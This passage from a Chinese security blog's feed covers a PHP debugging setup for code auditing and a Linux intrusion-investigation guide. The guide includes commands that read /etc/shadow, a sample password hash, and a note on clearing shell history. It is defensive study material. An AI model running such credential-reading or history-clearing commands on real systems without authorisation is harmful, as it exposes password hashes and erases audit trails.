class="line">xdebug.profiler_output_dir&#x3D;&quot;&#x2F;Applications&#x2F;MAMP&#x2F;tmp&quot;</span><br><span class="line">xdebug.idekey&#x3D;&quot;my_key&quot;</span><br></pre></td></tr></table></figure><p>出现下图的情况，说明Debug 配置正常。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911203443.png" alt="image-20200911203438853"></p><hr><blockquote><p>推荐将整个代码审计的路径设置成Project, 比如:  xxx/www/xxx</p><p>然后MAMP 和 PhpStorm 的设置要一致。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222248.png" alt="image-20200911204652392"></p><h1 id="单个文件调试"><a href="#单个文件调试" class="headerlink" title="单个文件调试"></a>单个文件调试</h1><p>测试Debug 是否成功：在第四行，变量字符串拼接的地方，下个断点进行调试。结果如图。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222425.png" alt="image-20200911205830698"></p><h1 id="整个文件夹-网站目录-调试"><a href="#整个文件夹-网站目录-调试" class="headerlink" title="整个文件夹(网站目录)调试"></a>整个文件夹(网站目录)调试</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222559.png" alt="image-20200911210726371"></p><blockquote><p>关键是选择下面的Server 即可。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222713.png" alt="image-20200911210857642"></p><p>PHPMyadmin 需要php  5.5+ , cms 安装时，数据库在phpmyadmin 中创建即可。</p><p>这里以国光师傅文章的cms，后台语言设置GetShell，来测试。</p><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-36">https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-36</a></p><p>在 149 行下断点调试</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222146.png"></p><p>可直接在<code>$lang_text</code> 中修改值即可进行调试。</p><p>Burp Suite 抓包的请求包：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222725.png" alt="image-20200911220557034"></p><h1 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222737.png" alt="image-20200911213334993"></p><h1 id="MySQL-监控"><a href="#MySQL-监控" class="headerlink" title="MySQL 监控"></a>MySQL 监控</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222752.png" alt="image-20200911214143396"></p><p>需要修改<code>config.ini</code> 中的数据库为之前cms 创建的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[dbconf]</span><br><span class="line">host&#x3D;localhost</span><br><span class="line">port&#x3D;8889</span><br><span class="line">user&#x3D;root</span><br><span class="line">password&#x3D;root</span><br><span class="line">db_name&#x3D;test</span><br><span class="line">charset&#x3D;utf8</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222811.png" alt="image-20200911214903921"></p><p>使用DataGrip 连接MySQL 时的监控日志</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223609.png" alt="image-20200911215237610"></p><h2 id="DataGrip-连接数据库"><a href="#DataGrip-连接数据库" class="headerlink" title="DataGrip 连接数据库"></a>DataGrip 连接数据库</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911222823.png" alt="image-20200911215449398"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223553.png" alt="image-20200911215526972"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911223540.png" alt="image-20200911215342544"></p><h1 id="VsCode-配置"><a href="#VsCode-配置" class="headerlink" title="VsCode 配置"></a>VsCode 配置</h1><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911234844.png" alt="image-20200911234023142"></p><p>VScode 单步调试。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200911235149.png" alt="image-20200911233946444"></p><p>终于会调试了~ </p><p>下一步就是去完整代码审计一下这个CMS~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;环境配置参考文章：&lt;a href=&quot;https://www.sqlsec.com/2020/07/</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>WAF Bypass 姿势总结</title>
    <link href="https://hack-for.fun/66043e4c.html"/>
    <id>https://hack-for.fun/66043e4c.html</id>
    <published>2020-09-11T05:39:04.000Z</published>
    <updated>2020-09-11T15:56:23.845Z</updated>
    
    
    
    
    
    <category term="渗透测试" scheme="https://hack-for.fun/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CTF-XSS</title>
    <link href="https://hack-for.fun/fb2051a0.html"/>
    <id>https://hack-for.fun/fb2051a0.html</id>
    <published>2020-09-09T08:46:34.000Z</published>
    <updated>2020-09-11T15:56:23.841Z</updated>
    
    <content type="html"><![CDATA[<p>xss：<a href="http://xssaq.com/wooyun/">http://xssaq.com/wooyun/</a></p><p>xss 练习平台：<a href="http://xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;xss：&lt;a href=&quot;http://xssaq.com/wooyun/&quot;&gt;http://xssaq.com/wooyun/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;xss 练习平台：&lt;a href=&quot;http://xss-quiz.int21h.jp/&quot;&gt;http://xss-quiz.</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-SSTI</title>
    <link href="https://hack-for.fun/936f84c6.html"/>
    <id>https://hack-for.fun/936f84c6.html</id>
    <published>2020-09-07T08:41:29.000Z</published>
    <updated>2020-09-11T15:56:23.843Z</updated>
    
    
    
    
    
    <category term="SSTI" scheme="https://hack-for.fun/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>Windows 服务器应急响应</title>
    <link href="https://hack-for.fun/54449ea6.html"/>
    <id>https://hack-for.fun/54449ea6.html</id>
    <published>2020-09-07T08:40:08.000Z</published>
    <updated>2020-09-11T15:56:23.847Z</updated>
    
    
    
    
    
    <category term="Linux应急响应" scheme="https://hack-for.fun/tags/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>Linux 服务器应急响应</title>
    <link href="https://hack-for.fun/e312198e.html"/>
    <id>https://hack-for.fun/e312198e.html</id>
    <published>2020-09-04T15:32:31.000Z</published>
    <updated>2020-09-07T08:40:36.620Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：2020年期间有幸参加了护网，客户在演习阶段出现了一次应急事件，Windows的邮件服务器出现了一个隐藏用户异地登录…… 当时客户有点情绪，加之我们这边确实都是擅长渗透、挖洞的师傅们，所以应急的时候显得很陌生，手忙脚乱，甚至可以说很业余。于是打算认真的按照网上一些关于应急响应的资料来复现一下，熟悉一些基本的东西。算是掌握一下常识好了。</p></blockquote><blockquote><p>所有参考资料仅用于学习</p></blockquote><p>Version1: 参考：Bypass 师傅的项目：<a href="https://bypass007.github.io/Emergency-Response-Notes/">https://bypass007.github.io/Emergency-Response-Notes/</a></p><h1 id="Linux-入侵排查"><a href="#Linux-入侵排查" class="headerlink" title="Linux 入侵排查"></a>Linux 入侵排查</h1><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些Linux服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-账号安全"><a href="#1-1-账号安全" class="headerlink" title="1.1 账号安全"></a>1.1 账号安全</h4><p><strong>基本使用：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1、用户信息文件&#x2F;etc&#x2F;passwd</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</span><br><span class="line">注意：无密码只允许本机登陆，远程不允许登陆</span><br><span class="line"></span><br><span class="line">2、影子文件&#x2F;etc&#x2F;shadow</span><br><span class="line">root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI&#x2F;:16809:0:99999:7:::</span><br><span class="line">用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</span><br><span class="line">who     查看当前登录用户（tty本地登陆  pts远程登录）</span><br><span class="line">w       查看系统信息，想知道某一时刻用户的行为</span><br><span class="line">uptime  查看登陆多久、多少用户，负载</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#39;&#x2F;\$1|\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;</span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">    usermod -L user    禁用帐号，帐号无法登录，&#x2F;etc&#x2F;shadow第二栏为!开头</span><br><span class="line">    userdel user       删除user用户</span><br><span class="line">    userdel -r user    将删除user用户，并且将&#x2F;home目录下的user目录一并删除</span><br></pre></td></tr></table></figure><h4 id="1-2-历史命令"><a href="#1-2-历史命令" class="headerlink" title="1.2 历史命令"></a>1.2 历史命令</h4><p><strong>基本使用：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">通过.bash_history查看帐号执行过的系统命令</span><br><span class="line">1、root的历史命令</span><br><span class="line">histroy</span><br><span class="line">2、打开&#x2F;home各帐号目录下的.bash_history，查看普通帐号的历史命令</span><br><span class="line"></span><br><span class="line">为历史的命令增加登录的IP地址、执行命令时间等信息：</span><br><span class="line">1）保存1万条命令</span><br><span class="line">sed -i &#39;s&#x2F;^HISTSIZE&#x3D;1000&#x2F;HISTSIZE&#x3D;10000&#x2F;g&#39; &#x2F;etc&#x2F;profile</span><br><span class="line">2）在&#x2F;etc&#x2F;profile的文件尾部添加如下行数配置信息：</span><br><span class="line">######jiagu history xianshi#########</span><br><span class="line">USER_IP&#x3D;&#96;who -u am i 2&gt;&#x2F;dev&#x2F;null | awk &#39;&#123;print $NF&#125;&#39; | sed -e &#39;s&#x2F;[()]&#x2F;&#x2F;g&#39;&#96;</span><br><span class="line">if [ &quot;$USER_IP&quot; &#x3D; &quot;&quot; ]</span><br><span class="line">then</span><br><span class="line">USER_IP&#x3D;&#96;hostname&#96;</span><br><span class="line">fi</span><br><span class="line">export HISTTIMEFORMAT&#x3D;&quot;%F %T $USER_IP &#96;whoami&#96; &quot;</span><br><span class="line">shopt -s histappend</span><br><span class="line">export PROMPT_COMMAND&#x3D;&quot;history -a&quot;</span><br><span class="line">######### jiagu history xianshi ##########</span><br><span class="line">3）source &#x2F;etc&#x2F;profile让配置生效</span><br><span class="line"></span><br><span class="line">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">3、历史操作命令的清除：history -c</span><br><span class="line">但此命令并不会清除保存在文件中的记录，因此需要手动删除.bash_profile文件中的记录。</span><br></pre></td></tr></table></figure><p><strong>入侵排查：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入用户目录下</span><br><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure><h4 id="1-3-检查异常端口"><a href="#1-3-检查异常端口" class="headerlink" title="1.3 检查异常端口"></a>1.3 检查异常端口</h4><p>使用netstat 网络连接命令，分析可疑端口、IP、PID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp|more</span><br><span class="line"></span><br><span class="line">查看下pid所对应的进程文件路径，</span><br><span class="line">运行ls -l &#x2F;proc&#x2F;$PID&#x2F;exe或file &#x2F;proc&#x2F;$PID&#x2F;exe（$PID 为对应的pid 号）</span><br></pre></td></tr></table></figure><h4 id="1-4-检查异常进程"><a href="#1-4-检查异常进程" class="headerlink" title="1.4 检查异常进程"></a>1.4 检查异常进程</h4><p>使用ps命令，分析进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure><h4 id="1-5-检查开机启动项"><a href="#1-5-检查开机启动项" class="headerlink" title="1.5 检查开机启动项"></a>1.5 检查开机启动项</h4><p><strong>基本使用：</strong></p><p>系统运行级别示意图：</p><table><thead><tr><th align="center">运行级别</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">关机</td></tr><tr><td align="center">1</td><td align="center">单用户模式，可以想象为windows的安全模式，主要用于系统修复</td></tr><tr><td align="center">2</td><td align="center">不完全的命令行模式，不含NFS服务</td></tr><tr><td align="center">3</td><td align="center">完全的命令行模式，就是标准字符界面</td></tr><tr><td align="center">4</td><td align="center">系统保留</td></tr><tr><td align="center">5</td><td align="center">图形模式</td></tr><tr><td align="center">6</td><td align="center">重启动</td></tr></tbody></table><p>查看运行级别命令 runlevel</p><p>系统默认允许级别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi  &#x2F;etc&#x2F;inittab</span><br><span class="line">id&#x3D;3：initdefault  系统开机后直接进入哪个运行级别</span><br></pre></td></tr></table></figure><p>开机启动配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;rc.local</span><br><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d</span><br></pre></td></tr></table></figure><p>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在/etc/init.d目录下，然后在/etc/rc.d/rc*.d中建立软链接即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost ~]# ln -s &#x2F;etc&#x2F;init.d&#x2F;sshd &#x2F;etc&#x2F;rc.d&#x2F;rc3.d&#x2F;S100ssh</span><br></pre></td></tr></table></figure><p>此处sshd是具体服务的脚本文件，S100ssh是其软链接，S开头代表加载时自启动；如果是K开头的脚本文件，代表运行级别加载时需要关闭的。</p><p><strong>入侵排查：</strong></p><p>启动项文件： more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/</p><h4 id="1-6-检查定时任务"><a href="#1-6-检查定时任务" class="headerlink" title="1.6 检查定时任务"></a>1.6 检查定时任务</h4><p><strong>基本使用</strong></p><p>1、利用crontab创建计划任务</p><ul><li>基本命令</li></ul><p>crontab -l 列出某个用户cron服务的详细内容</p><p>Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</p><p>crontab -r 删除每个用户cront任务(谨慎：删除所有的计划任务)</p><p>crontab -e 使用编辑器编辑当前的crontab文件</p><p>如：*/1* * echo “hello world” &gt;&gt; /tmp/test.txt 每分钟写入文件</p><p>2、利用anacron实现异步定时任务调度</p><ul><li>使用案例</li></ul><p>每天运行 /home/backup.sh脚本： vi /etc/anacrontab @daily 10 example.daily /bin/bash /home/backup.sh</p><p>当机器在 backup.sh 期望被运行时是关机的，anacron会在机器开机十分钟之后运行它，而不用再等待 7天。</p><p><strong>入侵排查</strong></p><p>重点关注以下目录中是否存在恶意脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;crontab</span><br><span class="line">&#x2F;etc&#x2F;cron.d&#x2F;*</span><br><span class="line">&#x2F;etc&#x2F;cron.daily&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;cron.hourly&#x2F;* </span><br><span class="line">&#x2F;etc&#x2F;cron.monthly&#x2F;*</span><br><span class="line">&#x2F;etc&#x2F;cron.weekly&#x2F;</span><br><span class="line">&#x2F;etc&#x2F;anacrontab</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;anacron&#x2F;*</span><br></pre></td></tr></table></figure><p>小技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more &#x2F;etc&#x2F;cron.daily&#x2F;*  查看目录下所有文件</span><br></pre></td></tr></table></figure><h4 id="1-7-检查服务"><a href="#1-7-检查服务" class="headerlink" title="1.7 检查服务"></a>1.7 检查服务</h4><p><strong>服务自启动</strong></p><p>第一种修改方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chkconfig [--level 运行级别] [独立服务名] [on|off]</span><br><span class="line">chkconfig –level  2345 httpd on  开启自启动</span><br><span class="line">chkconfig httpd on （默认level是2345）</span><br></pre></td></tr></table></figure><p>第二种修改方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改&#x2F;etc&#x2F;re.d&#x2F;rc.local 文件  </span><br><span class="line">加入 &#x2F;etc&#x2F;init.d&#x2F;httpd start</span><br></pre></td></tr></table></figure><p>第三种修改方法：</p><p>使用ntsysv命令管理自启动，可以管理独立服务和xinetd服务。</p><p><strong>入侵排查</strong></p><p>1、查询已安装的服务：</p><p>RPM包安装的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务</span><br><span class="line">ps aux | grep crond 查看当前服务</span><br><span class="line"></span><br><span class="line">系统在3与5级别下的启动项 </span><br><span class="line">中文环境</span><br><span class="line">chkconfig --list | grep &quot;3:启用\|5:启用&quot;</span><br><span class="line">英文环境</span><br><span class="line">chkconfig --list | grep &quot;3:on\|5:on&quot;</span><br></pre></td></tr></table></figure><p>源码包安装的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看服务安装位置 ，一般是在&#x2F;user&#x2F;local&#x2F;</span><br><span class="line">service httpd start</span><br><span class="line">搜索&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;  查看是否存在</span><br></pre></td></tr></table></figure><h4 id="1-8-检查异常文件"><a href="#1-8-检查异常文件" class="headerlink" title="1.8 检查异常文件"></a>1.8 检查异常文件</h4><p>1、查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性</p><p>2、得到发现WEBSHELL、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p> 可以使用find命令来查找，如 find /opt -iname “*” -atime 1 -type f 找出 /opt 下一天前访问过的文件</p><p>3、针对可疑文件可以使用stat进行创建修改时间。</p><h4 id="1-9-检查系统日志"><a href="#1-9-检查系统日志" class="headerlink" title="1.9 检查系统日志"></a>1.9 检查系统日志</h4><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">记录了系统定时任务相关的日志</td></tr><tr><td align="center">/var/log/cups</td><td align="center">记录打印信息的日志</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">记录邮件信息</td></tr><tr><td align="center">/var/log/message</td><td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td align="center">/var/log/secure</td><td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>日志分析技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">2、登录成功的IP有哪些：     </span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name&#x3D;kali, GID&#x3D;1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name&#x3D;kali, UID&#x3D;1001, GID&#x3D;1001, home&#x3D;&#x2F;home&#x2F;kali</span><br><span class="line">, shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; &#x2F;var&#x2F;log&#x2F;secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line"># grep &quot;userdel&quot; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid&#x3D;0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY&#x3D;pts&#x2F;4 ; PWD&#x3D;&#x2F;home&#x2F;good ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;sbin&#x2F;shutdown -r now</span><br></pre></td></tr></table></figure><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-Rootkit查杀"><a href="#2-1-Rootkit查杀" class="headerlink" title="2.1 Rootkit查杀"></a>2.1 Rootkit查杀</h4><ul><li><p>chkrootkit</p><p>网址：<a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">wget ftp:&#x2F;&#x2F;ftp.pangeia.com.br&#x2F;pub&#x2F;seg&#x2F;pac&#x2F;chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense</span><br><span class="line">#编译完成没有报错的话执行检查</span><br><span class="line">.&#x2F;chkrootkit</span><br></pre></td></tr></table></figure></li><li><p>rkhunter</p><p>网址：<a href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">Wget 